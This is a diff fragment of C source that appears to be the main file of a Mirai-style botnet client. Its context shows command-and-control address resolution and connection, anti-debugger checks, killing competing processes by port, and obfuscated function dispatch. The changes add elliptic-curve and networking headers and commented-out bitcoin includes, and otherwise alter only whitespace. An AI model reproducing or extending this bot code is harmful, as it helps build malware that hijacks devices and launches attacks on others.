@@ -24,6 +24,11 @@
 #include "util.h"
 #include "resolv.h"
 
+//#include "btc.h"
+#include "ecc.h"
+#include "net.h"
+//#include "../btc/include/ecc.h"
+
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
 static void establish_connection(void);
@@ -161,6 +166,7 @@ int main(int argc, char **args)
 #endif
 #endif
 
+
     while (TRUE)
     {
         fd_set fdsetrd, fdsetwr, fdsetex;
@@ -288,7 +294,7 @@ int main(int argc, char **args)
                 else
                     n = 0; // Cause connection to close
             }
-            
+
             // If n == 0 then we close the connection!
             if (n == 0)
             {
@@ -453,7 +459,7 @@ static void ensure_single_instance(void)
             printf("[main] Failed to connect to fd_ctrl to request process termination\n");
 #endif
         }
-        
+
         sleep(5);
         close(fd_ctrl);
         killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
@@ -519,7 +525,7 @@ static BOOL unlock_tbl_if_nodebug(char *argv0)
         fold += ~argv0[ii % util_strlen(argv0)];
     }
     fold %= (sizeof (obf_funcs) / sizeof (void *));
-    
+
 #ifndef DEBUG
     (obf_funcs[fold])();
     matches = util_strcmp(argv0, buf_dst);
